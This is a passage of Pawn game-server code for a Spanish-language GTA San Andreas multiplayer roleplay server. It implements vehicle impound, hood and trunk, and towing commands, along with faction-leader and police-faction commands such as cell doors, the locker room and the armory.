 	for(new i=0; i <= TotalVeh; i++)
	{
		if(!IsABoat(car) && IsVehicleInRangeOfPoint(4.0, i, 2274.1028,-2345.5371,13.5469) && GetVehicleVirtualWorld(i) == 0)
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo en el punto de entrega.");
			return 1;
		}
		if(IsABoat(car) && IsVehicleInRangeOfPoint(4.0, i, 2294.3999,-2447.8000,0.0000) && GetVehicleVirtualWorld(i) == 0)
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo en el punto de entrega.");
			return 1;
		}
	}
	
 	GivePlayerMoneyAC(playerid, -precio);
	format(string, sizeof(string), "* Has retirado tu %s del depósito de Ocean Docks por %d$.", CarInfo[car][cNombreModelo], precio);
    SendClientMessage(playerid, Amarillo, string);
    format(string, sizeof(string), "'%s' ha sacado su %s del depósito de Ocean Docks por %d$.", GetPlayerNameRP(playerid), CarInfo[car][cNombreModelo], precio);
    SendAdminMessage(Aguamarina, string);
    printf(string);
    SetVehicleVirtualWorld(car, 0);
    LinkVehicleToInteriorEx(car, 0);
    CarInfo[car][cEnDeposito] = 0;
    CarInfo[car][cGas] = 15;
    if(IsABoat(car)){SetVehiclePos(car, 2294.3999,-2447.8000,0.0000);}
    if(!IsABoat(car)){SetVehiclePos(car, 2274.1028,-2345.5371,13.5469);}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/capo", true) == 0) //Abrir capó del vehículo
{
	if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != 2){SendClientMessage(playerid, Rojo, "* No estás en un vehículo como conductor."); return 1;}
	new car = GetPlayerVehicleID(playerid);
	if(IsABike(car) || IsAMBike(car) || IsABoat(car) || IsAPlane(car)){SendClientMessage(playerid, Rojo, "* Este vehículo no tiene capó."); return 1;}
    new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    if(VehCapo[car] == 1)
    {
        SetVehicleParamsEx(car,engine,lights,alarm,doors,0,boot,objective);
        format(string, sizeof(string), "* %s cierra el capó de su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehCapo[car] = 0;
    }
    else
    {
        SetVehicleParamsEx(car,engine,lights,alarm,doors,1,boot,objective);
        format(string, sizeof(string), "* %s abre el capó de su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehCapo[car] = 1;
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/maletero", true) == 0 || strcmp(cmd, "/mal", true) == 0) //Abrir maletero del vehículo
{
    new opcion[128];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /(Mal)etero [Abrir/Ver/Cerrar]");
		return 1;
	}
	
 	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No puedes abrir el maletero desde dentro de un vehículo."); return 1;}
 	
	if(strcmp(opcion,"abrir",true) == 0) //Abrir maletero
	{
	    new car, Float:distancia = 4.0, Float:vX, Float:vY, Float:vZ;
		for(new x=0; x <= TotalVeh; x++)
		{
		    GetVehiclePos(x, vX, vY, vZ);
		    if(IsPlayerInRangeOfPoint(playerid, 3.5, vX, vY, vZ) && !IsABike(x) && VehMaletero[x] == 0 && (PlayerTieneLlaveVeh(playerid, x) || PlayerEsFaccionVeh(playerid, x)))
		    {
		        if(GetPlayerDistanceFromPoint(playerid, vX, vY, vZ) <= distancia)distancia = GetPlayerDistanceFromPoint(playerid, vX, vY, vZ), car = x;
		    }
		}
		if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo a tu alrededor que puedas abrir."); return 1;}
		new engine,lights,alarm,doors,bonnet,boot,objective;
	    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	    SetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,1,objective);
        format(string, sizeof(string), "* %s abre el maletero de un vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehMaletero[car] = 1;
 	    MostrarMaletero(playerid, car);
	    VehMaleteroPlayer[playerid] = car;
 	    return 1;
	}
	else if(strcmp(opcion,"ver",true) == 0) //Mostrar maletero
	{
	    new car, Float:distancia = 3.5, Float:vX, Float:vY, Float:vZ;
		for(new x=0; x <= TotalVeh; x++)
		{
		    GetVehiclePos(x, vX, vY, vZ);
		    if(IsPlayerInRangeOfPoint(playerid, 4.0, vX, vY, vZ) && !IsABike(x) && VehMaletero[x] == 1)
		    {
		        if(GetPlayerDistanceFromPoint(playerid, vX, vY, vZ) <= distancia)distancia = GetPlayerDistanceFromPoint(playerid, vX, vY, vZ), car = x;
		    }
		}
		if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo a tu alrededor con el maletero abierto."); return 1;}
	    MostrarMaletero(playerid, car);
	    VehMaleteroPlayer[playerid] = car;
	    return 1;
	}
	else if(strcmp(opcion,"cerrar",true) == 0) //Cerrar maletero
	{
	    new car, Float:distancia = 3.5, Float:vX, Float:vY, Float:vZ;
		for(new x=0; x <= TotalVeh; x++)
		{
		    GetVehiclePos(x, vX, vY, vZ);
		    if(IsPlayerInRangeOfPoint(playerid, 4.0, vX, vY, vZ) && !IsABike(x) && VehMaletero[x] == 1)
		    {
		        if(GetPlayerDistanceFromPoint(playerid, vX, vY, vZ) <= distancia)distancia = GetPlayerDistanceFromPoint(playerid, vX, vY, vZ), car = x;
		    }
		}
		if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo a tu alrededor con el maletero abierto."); return 1;}
		new engine,lights,alarm,doors,bonnet,boot,objective;
    	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	    SetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,0,objective);
        format(string, sizeof(string), "* %s cierra el maletero de un vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    VehMaletero[car] = 0;
 	    return 1;
	}
	else{SendClientMessage(playerid, Naranja, "* /(Mal)etero [Abrir/Ver/Cerrar]"); return 1;}
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/remolcar", true) == 0) //Remolcar un vehículo
{
	if(PlayerInfo[playerid][pFaccion] != 1 && PlayerInfo[playerid][pTrabajo] != 7){SendClientMessage(playerid, Rojo, "* No eres mecánico o policía."); return 1;}
	if((PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] == 0) && PlayerInfo[playerid][pHabMec] < 60){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 de mecánico para usar este comando."); return 1;}
	if((PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] == 0) && (PlayerInfo[playerid][pTrabajo] == 7 && Trabajando[playerid] == 0)){SendClientMessage(playerid, Rojo, "* No estás de servicio como mecánico ni como policía."); return 1;}
	if((PlayerInfo[playerid][pFaccion] == 0) && (PlayerInfo[playerid][pTrabajo] == 7 && Trabajando[playerid] == 0)){SendClientMessage(playerid, Rojo, "* No estás de servicio como mecánico."); return 1;}
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525 || GetPlayerState(playerid) != 2){SendClientMessage(playerid, Rojo, "* No estás en una grúa como conductor."); return 1;}
	new Float:vX,Float:vY,Float:vZ;
	new car, Float:distancia = 7.0;
	new IDGrua = GetPlayerVehicleID(playerid);
	for(new x=0; x <= TotalVeh; x++)
	{
	    GetVehiclePos(x, vX, vY, vZ);
	    if(IsVehicleInRangeOfPoint(7.0,IDGrua, vX, vY, vZ) && x != IDGrua && !IsABike(x))
	    {
	        if(GetVehicleDistanceFromPoint(IDGrua, vX, vY, vZ) <= distancia)distancia = GetVehicleDistanceFromPoint(IDGrua, vX, vY, vZ), car = x;
	    }
	}
	if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo alrededor de la grúa."); return 1;}
	if(IsTrailerAttachedToVehicle(IDGrua))
	{
    	DetachTrailerFromVehicle(IDGrua);
    	SendClientMessage(playerid, Amarillo, "Vehículo desenganchado.");
   	}
   	else
   	{
		AttachTrailerToVehicle(car,IDGrua);
		SendClientMessage(playerid, Amarillo, "Vehículo enganchado.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

//----------COMANDOS LÍDER----------//

if(strcmp(cmd, "/reclutar", true) == 0) //Invitar gente a una facción
{
	if(PlayerInfo[playerid][pLider] <= 0){SendClientMessage(playerid,Rojo,"* No eres líder de una facción."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Reclutar [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid,Rojo,"* No te puedes reclutar a tí mismo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(PlayerInfo[playerid][pFaccion] == PlayerInfo[playerid2][pFaccion]){SendClientMessage(playerid,Rojo,"* Este jugador ya forma parte de tu facción."); return 1;}
    if(PlayerInfo[playerid2][pFaccion] != 0){SendClientMessage(playerid,Rojo,"* Este jugador ya forma parte de una facción."); return 1;}
    if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
    reclutarfaccion[playerid2] = PlayerInfo[playerid][pFaccion];
    reclutarlider[playerid2] = playerid;
	format(string, sizeof(string), "* %s te ha invitado a su facción. Escribe '/Aceptar Faccion' para unirte", GetPlayerNameRP(playerid));
	SendClientMessage(playerid2, Amarillo, string);
	format(string, sizeof(string), "* Has invitado a %s a tu facción, espera a que responda.", GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, Amarillo, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/promover", true) == 0) //Dar rangos a miembros de una facción
{
	if(PlayerInfo[playerid][pLider] <= 0){SendClientMessage(playerid,Rojo,"* No eres líder de una facción."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Promover [ID] [Rango]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(PlayerInfo[playerid][pFaccion] != PlayerInfo[playerid2][pFaccion]){SendClientMessage(playerid,Rojo,"* Este jugador no forma parte de tu facción."); return 1;}
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Promover [ID] [Rango]");
        return 1;
    }
    new rango = strval(tmp);
    if(rango < 1 || rango > 8){SendClientMessage(playerid,Rojo,"* El rango debe estar entre 1 y 8."); return 1;}
    PlayerInfo[playerid2][pRango] = rango;
	format(string, sizeof(string), "* %s te ha promovido a rango %d.", GetPlayerNameRP(playerid), rango);
	SendClientMessage(playerid2, Amarillo, string);
	format(string, sizeof(string), "* Has promovido a rango %d a %s.", rango, GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, Amarillo, string);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/expulsar", true) == 0) //Expulsar miembros de una facción
{
	if(PlayerInfo[playerid][pLider] <= 0){SendClientMessage(playerid,Rojo,"* No eres líder de una facción."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Expulsar [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes expulsar a tí mismo, si quieres dejar la facción habla con un administrador."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(PlayerInfo[playerid][pFaccion] != PlayerInfo[playerid2][pFaccion]){SendClientMessage(playerid,Rojo,"* Este jugador no forma parte de tu facción."); return 1;}
    PlayerInfo[playerid2][pRango] = 0;
    PlayerInfo[playerid2][pFaccion] = 0;
    PlayerInfo[playerid2][pServicioPD] = 0;
	format(string, sizeof(string), "* %s te ha expulsado de su facción.", GetPlayerNameRP(playerid));
	SendClientMessage(playerid2, Amarillo, string);
	format(string, sizeof(string), "* Has expulsado a %s de tu facción.", GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, Amarillo, string);
    return 1;
}

//----------COMANDOS FACCIONES----------//

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/sir", true) == 0) //Sirena LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1) return SendClientMessage(playerid, Rojo, "* No eres policía.");
    new coche = GetPlayerVehicleID(playerid);
    if(coche == 0) return SendClientMessage(playerid, Rojo, "* No estás en un coche.");
    if(PlayerInfo[playerid][pServicioPD] == 0) return SendClientMessage(playerid, Rojo, "* No estás de servicio.");
    if(!IsValidDynamicObject(SirenaCoche[coche]))
    {
    	SirenaCoche[coche] = CreateDynamicObject(18646,0, 0, 0, 0.0, 0.0, 96.0);
		AttachDynamicObjectToVehicle(SirenaCoche[coche], coche, -0.2083, -0.03, 0.77, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "* %s coloca una sirena de policía en su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	}
	else
	{
		DestroyDynamicObject(SirenaCoche[coche]);
		format(string, sizeof(string), "* %s quita una sirena de policía de su vehículo.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/informes", true) == 0) //Informes LSED
{
	if(PlayerInfo[playerid][pFaccion] != 2) return SendClientMessage(playerid, Rojo, "* No perteneces a LSED.");
	new contador, linea[256], dialog[1024], estado[10];
	for(new i = 0; i < MAX_LSEDINFORMES; i++)
	{
        if(InformeEmergencias[i][ieEstado] != NOEXISTE)
        {
            contador ++;
            if(InformeEmergencias[i][ieEstado] == 0) estado = "en espera";
            else estado = "en camino";
            format(linea, sizeof(linea), "{FFFFFF}[#%d] Estado: %s", contador, estado);
	    	strcat(dialog, linea);
		}
	}
	if(contador == 0){SendClientMessage(playerid, Rojo, "* Actualmente no hay informes para LSED."); return 1;}
	ShowPlayerDialog(playerid, 33, DIALOG_STYLE_LIST, "{FFFFFF}Informes de emergencia", dialog, "Atender", "Cancelar");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/ap", true) == 0) //Comando para abrir puertas
{
	AbrirPuerta(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/apatio", true)) //Comando para abrir puerta partio prisión
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 5, 2571.3999000,-1304.8300000,1043.0000000))
    {
        MoveDynamicObject(puertapatioprision, 2571.4004000,-1307.7000000,1043.0000000, 3.0);
    }
    else{SendClientMessage(playerid,Rojo,"* No estás cerca de la puerta del patio de la prisión federal."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/cpatio", true)) //Comando para cerrar puerta partio prisión
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 5, 2571.3999000,-1304.8300000,1043.0000000))
    {
        MoveDynamicObject(puertapatioprision, 2571.3999000,-1304.8300000,1043.0000000, 3.0);
    }
    else{SendClientMessage(playerid,Rojo,"* No estás cerca de la puerta del patio de la prisión federal."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/celda", true)) //Comando para abrir celdas de LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 3, 266.31, 76.71, 1001.2900))
    {
        MoveDynamicObject(Celda1, 266.2500, 76.9000, 1001.2900, 3.0);
        SetTimerEx("CerrarPuerta",3000,0,"p",Celda1);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 3, 266.25, 82.95, 1001.29))
    {
        MoveDynamicObject(Celda2, 266.25, 81.39, 1001.29, 3.0);
        SetTimerEx("CerrarPuerta",3000,0,"p",Celda2);
    }
	else if(IsPlayerInRangeOfPoint(playerid, 3, 266.25, 87.46, 1001.29))
    {
        MoveDynamicObject(Celda3, 266.25, 85.9, 1001.29, 3.0);
        SetTimerEx("CerrarPuerta",3000,0,"p",Celda3);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2555.7200000,-1304.1000000,1043.1000000)) //Prisión federal
    {
        SetDynamicObjectRot(puertaceldaprision1, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision1);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2559.6199000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision2, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision2);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2551.8210000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision3, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision3);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2547.9224000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision4, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision4);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2544.0237000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision5, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision5);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2540.1243000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision6, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision6);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2536.2253000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision7, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision7);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2532.3264000,-1304.0996000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision8, 0.0000000,0.0000000,90.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision8);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2561.6799300,-1283.6899400,1043.0999800))
    {
        SetDynamicObjectRot(puertaceldaprision9, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision9);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2557.7798000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision10, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision10);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2553.8799000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision11, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision11);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2549.9800000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision12, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision12);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2546.0798000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision13, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision13);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2542.1799000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision14, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision14);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 2538.2798000,-1283.6895000,1043.1000000))
    {
        SetDynamicObjectRot(puertaceldaprision15, 0.0000000,0.0000000,270.0000000);
        SetTimerEx("CerrarPuerta",3000,0,"p",puertaceldaprision15);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/embargar", true)) //Comando para meter vehículo en depósito de LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] <= 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    if(PlayerInfo[playerid][pRango] < 3){SendClientMessage(playerid,Rojo,"* Necesitas tener al menos rango 3 para usar este comando."); return 1;}
    if(!IsPlayerInDynamicArea(playerid, AreaDepositoLSPD)){SendClientMessage(playerid,Rojo,"* No estás en el depósito de vehículos de LSPD."); return 1;}
    if(!GetPlayerVehicleID(playerid)){SendClientMessage(playerid,Rojo,"* No estás en un vehículo."); return 1;}
    new carid = GetPlayerVehicleID(playerid);
    if(carid <= MAX_VEHPUBLICO){SendClientMessage(playerid,Rojo,"* No puedes embargar vehículos públicos."); return 1;}
    if(CarInfo[carid][cEnDeposito] == 2){SendClientMessage(playerid,Rojo,"* Este vehículo ya está embargado."); return 1;}
    
    CarInfo[carid][cEnDeposito] = 2;
	SaveCar(carid);
	
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
   	SetVehicleParamsEx(carid,0,lights,alarm,doors,bonnet,boot,objective);
   	RemovePlayerFromVehicle(playerid);
   	
	format(string, sizeof(string), "Has embargado el vehículo #%d.", carid);
    SendClientMessage(playerid, Amarillo, string);
    if(strlen(CarInfo[carid][cDueno]))
    {
        format(string, sizeof(string), "Ahora su dueño, '%s', tendrá que pagar una multa de %d$ para sacarlo del depósito.", CarInfo[carid][cDueno], CarInfo[carid][cValor]/30);
    	SendClientMessage(playerid, Amarillo, string);
    }
    format(string, sizeof(string), "El agente '%s' ha estacionado el vehículo #%d en el depósito de LSPD.", GetPlayerNameRP(playerid), carid);
    SendAdminMessage(Aguamarina, string);
    printf(string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/deposito", true)) //Comando para abrir deposito de LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] <= 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 10, 1620.6500,-1861.5996,15.3000))
    {
        MoveDynamicObject(lspddeposito, 1612.0996,-1861.5996,15.3000, 2.5);
        SetTimerEx("CerrarPuerta",4000,0,"p",lspddeposito);
        format(string, sizeof(string), "* %s abre la puerta del depósito.", GetPlayerNameRP(playerid));
    	ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    	return 1;
    }
    else{SendClientMessage(playerid,Rojo,"* No estás en la entrada al depósito del LSPD.");}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/vestuario", true)) //Vestuario de LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] == 0 && (PlayerInfo[playerid][pManoDer] > 0 || PlayerInfo[playerid][pManoIzq] > 0 || PlayerInfo[playerid][pEspalda] > 0)){SendClientMessage(playerid,Rojo,"* Debes guardar antes tus objetos (manos y espalda)."); return 1;}
    if(SolicitaRefuerzos[playerid] == 1){SendClientMessage(playerid,Rojo,"* No puedes cambiarte mientras solicitas refuerzos. Escribe '/NoRef'."); return 1;}
    if(MascaraGas[playerid] == 1){MascaraGas[playerid] = 0; RemovePlayerAttachedObject(playerid, 8);}
    if(IsPlayerInRangeOfPoint(playerid, 3, 267.6066,118.4081,1004.6172))
    {
        new cadena[300];
		strcat(cadena, "Uniforme de cadete\n");
		strcat(cadena, "Uniforme de motero\n");
		strcat(cadena, "Uniforme de oficial 1\n");
		strcat(cadena, "Uniforme de oficial 2\n");
		strcat(cadena, "Uniforme de oficial 3\n");
		strcat(cadena, "Uniforme de oficial 4\n");
		strcat(cadena, "Uniforme de oficial 5\n");
		strcat(cadena, "Paisano (5)\n");
		strcat(cadena, "Traje de SWAT\n");
		strcat(cadena, "Uniforme de superior\n");
		strcat(cadena, "Uniforme de comisario\n");
		strcat(cadena, "Skin de mujer\n");
		strcat(cadena, "Ropa normal");
		ShowPlayerDialog(playerid, 3, 2, "Taquilla", cadena,"Seleccionar", "Cancelar");
    }
    else if(IsPlayerInRangeOfPoint(playerid, 3, 1085.0271,-803.6704,1088.3669))
    {
        new cadena[300];
		strcat(cadena, "Uniforme de carcelero\n");
		strcat(cadena, "Ropa normal");
		ShowPlayerDialog(playerid, 31, 2, "Taquilla", cadena,"Seleccionar", "Cancelar");
    }
    else{SendClientMessage(playerid,Rojo,"* No estás en las taquillas de comisaría."); return 1;}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(!strcmp(cmdtext, "/armeria", true)) //Armeria de LSPD
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
    if(IsPlayerInRangeOfPoint(playerid, 3, 220.0135,79.7864,1005.0391) || IsPlayerInRangeOfPoint(playerid, 3, 1086.6472,-807.9135,1088.3669))
    {
        new cadena[450];
		strcat(cadena, "Chaleco antibalas\n"); //Lista 1
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "Porra\n");
		strcat(cadena, "Spray\n");
		strcat(cadena, "Táser\n");
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "M1911\n");
		strcat(cadena, "Cargador M1911\n");
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "D. Eagle\n");
		strcat(cadena, "Cargador D. Eagle\n");
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "Winchester 1200\n");
		strcat(cadena, "Cartuchos 12GA\n");
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "MP5A4\n");
		strcat(cadena, "Cargador MP5A4\n");
		strcat(cadena, "|--------------------------------------|\n");
		strcat(cadena, "SIGUIENTE >>");
		ShowPlayerDialog(playerid, 34, 2, "Armería", cadena,"Seleccionar", "Cancelar");
    }
    else{SendClientMessage(playerid,Rojo,"* No estás en la armería de comisaría o de la prisión federal."); return 1;}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/recogerprueba",true) == 0) //Recoger pruebas del suelo
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT || PlayerInfo[playerid][pMuerto] > 0){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
	new ObjetoRecogido;
	for(new i = 0; i < sizeof(DropInfo); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0,DropInfo[i][DropPosX],DropInfo[i][DropPosY],DropInfo[i][DropPosZ]))
		{
			if(GetPlayerVirtualWorld(playerid) == DropInfo[i][DropVWorld] && GetPlayerInterior(playerid) == DropInfo[i][DropInterior])
			{
			    if(DropInfo[i][DropID] == 0) break;
				DestroyDynamicObject(DropObject[i]);
				format(string, sizeof(string), "* Recoges un/a {fce80c}%s (%d) {fdfe8b}del suelo como prueba de algún delito.", ObjetoInfo[DropInfo[i][DropID]][NombreObjeto], DropInfo[i][DropCantidad]);
				SendClientMessage(playerid, AmarilloClaro, string);
				format(string, sizeof(string), "* %s recoge un/a %s del suelo como prueba de algún delito.", GetPlayerNameRP(playerid), ObjetoInfo[DropInfo[i][DropID]][NombreObjeto]);
 	    		ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
				DropInfo[i][DropPosX] = 0.0;
				DropInfo[i][DropPosY] = 0.0;
				DropInfo[i][DropPosZ] = 0.0;
				DropInfo[i][DropID] = 0;
				DropInfo[i][DropCantidad] = 0;
				Streamer_Update(playerid);
				ObjetoRecogido = 1;
				break;
			}
		}
	}
	if(ObjetoRecogido == 0){SendClientMessage(playerid, Rojo, "* No estás cerca de ningún objeto."); return 1;}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/esposar", true) == 0) //Esposar a un jugador
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
